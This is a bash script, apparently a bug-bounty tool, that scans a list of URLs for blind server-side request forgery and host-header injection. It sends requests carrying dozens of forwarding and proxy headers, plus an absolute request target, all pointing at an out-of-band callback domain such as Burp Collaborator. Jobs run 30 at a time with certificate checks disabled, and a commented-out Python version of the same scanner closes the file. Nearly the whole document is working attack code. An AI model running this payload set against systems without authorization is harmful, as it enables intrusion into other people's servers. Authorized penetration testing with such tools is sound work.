#! /bin/bash
# interactsh-client -v -json
if [ $# -lt 2 ];then
	echo "Usage: ./header-ssrf.sh urls.txt xxxxx.burpcollaborator.net"
	exit
fi

function curl_wapper(){
	curl -k -s -o /dev/null -m 3 --path-as-is -w "%{http_code}","%{size_download}" -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" "$@"
}

function payload(){
  RED='\033[0;31m'
  NC='\033[0m' # No Color
  # printf "${RED}$1${NC}\n"
  httpv=$(echo $1|cut -d "/" -f1) # http:
  fqdn=$(echo $1|cut -d "/" -f3)
  tmp=${1#*//}
  rewrite=${tmp#*/}
  # rewrite=$(echo $1|cut -d "/" -f4)
  url_prefix="${httpv}//${fqdn}@"

  curl_wapper -H "X-Host: ${fqdn}.xh.$2" \
			  -H "Proxy-Host: ${fqdn}.ph.$2" \
			  -H "Request-Uri: ${url_prefix}${fqdn}.ru.$2" \
			  -H "X-Forwarded: ${fqdn}.xf.$2" \
			  -H "X-Forwarded-By: ${fqdn}.xfb.$2" \
			  -H "X-Forwarded-For-Original: ${fqdn}.xffo.$2" \
			  -H "X-Forwarded-Server: ${fqdn}.xfs.$2" \
			  -H "X-Forwarder-For: ${fqdn}.xfrf.$2" \
			  -H "X-Forward-For: ${fqdn}.xfdf.$2" \
			  -H "Base-Url: ${url_prefix}${fqdn}.bu.$2" \
			  -H "Http-Url: ${url_prefix}${fqdn}.hu.$2" \
			  -H "Proxy-Url: ${url_prefix}${fqdn}.pu.$2" \
			  -H "Redirect: ${url_prefix}${fqdn}.r.$2" \
			  -H "Real-Ip: ${fqdn}.ri.$2" \
			  -H "Referer: ${url_prefix}${fqdn}.referer.$2" \
			  -H "Referrer: ${url_prefix}${fqdn}.referrer.$2" \
			  -H "Refferer: ${url_prefix}${fqdn}.refferer.$2" \
			  -H "Uri: ${url_prefix}${fqdn}.uri.$2" \
			  -H "Url: ${url_prefix}${fqdn}.url.$2" \
			  -H "X-Http-Destinationurl: ${url_prefix}${fqdn}.xhd.$2" \
			  -H "X-Http-Host-Override: ${fqdn}.xhho.$2" \
			  -H "X-Original-Remote-Addr: ${fqdn}.xora.$2" \
			  -H "X-Proxy-Url: ${url_prefix}${fqdn}.xpu.$2" \
			  -H "X-Real-Ip: ${fqdn}.xri.$2" \
			  -H "X-Remote-Addr: ${fqdn}.xra.$2" \
			  "$1"; echo -e "\t\t=> too many header one curl, fqdn: ${RED}${fqdn}${NC}"

  curl_wapper -H "X-Forwarded-For: ${fqdn}.xff.$2" "$1"; echo -e  "\t\t=> ${RED}X-Forwarded-For: ${fqdn}${NC}.xff.$2"
  curl_wapper -H "X-Forwarded-Host: ${fqdn}.xfh.$2" "$1"; echo -e  "\t\t=> ${RED}X-Forwarded-Host: ${fqdn}${NC}.xfh.$2"
  curl_wapper --request-target  "http://${fqdn}.rt.$2/" $1; echo -e  "\t\t=> ${RED}GET http://${fqdn}.rt.$2/ HTTP/1.1"
  # curl_wapper -H "Host: ${fqdn}.h.$2" --request-target  "${httpv}//127.0.0.1/${rewrite}" $1; echo -e  "\t\t=> ${RED}GET ${httpv}//127.0.0.1/${rewrite} HTTP/1.1 \t Host: ${fqdn}.h.$2"
  # curl_wapper -H "Host: ${fqdn}.h.$2" "$1"; echo -e  "\t\t=> ${RED}HTTP/1.1 \t Host: ${fqdn}${NC}.h.$2" 
  # curl_wapper --http1.0 -H "Host: ${fqdn}.http1.0.h.$2" "$1"; echo -e "\t\t=> ${RED}HTTP/1.0 \t Host: ${fqdn}${NC}.http1.0.h.$2" 
  # --raw-requests
}
export -f curl_wapper
export -f payload
cat $1|xargs -P 30 -I {} bash -c 'payload "$@"' _ {} $2


#   wait
# done < "$1"




# import requests
# # import sys
# import urllib3

# urllib3.disable_warnings()


# # if len(sys.argv) < 4:
# #   print(f"Usage: {sys.argv[0]} urls.txt oob-domain")

# urls="./urls.txt"
# oob=""

# # urls = sys.argv[1]
# # oob = sys.argv[2]

# def req(url,headers):
#   try:
#       resp = requests.get(url,headers,timeout=8,verify=False)
#   except Exception as e:
#       print(e.__class__.__name__)
#   else:
#       print(resp.status_code,url,headers)
#   finally:
#       pass
# base_header={}
# base_header["User-Agent"] = "ua-test"


# payloads=[
#   {
#       "X-Host": oob
#   },

#   {
#       "X-Forwarded-For": oob
#   },

# ]

# with open(urls) as f:
#   for url in f:
#       tag = 0
#       for payload in payloads:
#           payload.update(base_header)
#           req(url,payload)
#           # ["X-Host"]
#           # for header in payload:
#           #   headers[header] = oob
#           # print(headers)
#           # req(url,headers)







































